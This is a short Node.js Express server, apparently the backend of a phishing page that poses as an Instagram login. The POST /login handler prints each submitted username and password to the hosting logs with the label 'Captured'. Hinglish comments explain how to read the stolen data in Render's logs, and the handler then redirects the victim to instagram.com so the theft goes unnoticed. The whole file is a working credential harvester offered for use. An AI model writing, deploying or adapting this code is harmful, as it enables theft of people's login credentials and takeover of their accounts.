const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.static(__dirname));
app.use(bodyParser.urlencoded({ extended: true }));

app.post("/login", (req, res) => {
  const { username, password } = req.body;

  // ⚠️ File me save nahi hoga (Render free me persist nahi hota)
  // 👉 Console me print hoga (jo tum Render Logs me dekh sakte ho)
  console.log(`Captured -> Username: ${username}, Password: ${password}`);

  // Redirect back (for demo purpose)
  res.redirect("https://instagram.com");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
